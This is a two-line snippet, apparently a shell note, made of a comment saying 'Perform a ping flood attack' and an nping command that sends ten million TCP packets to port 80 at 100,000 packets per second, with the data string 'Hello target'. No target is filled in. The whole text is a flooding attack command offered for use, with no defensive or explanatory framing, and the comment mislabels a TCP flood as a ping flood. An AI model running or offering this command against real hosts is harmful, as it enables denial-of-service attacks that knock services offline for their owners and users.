# Perform a ping flood attack
nping -c 10000000 --rate 100000 --tcp -p 80 --data-string "Hello target"
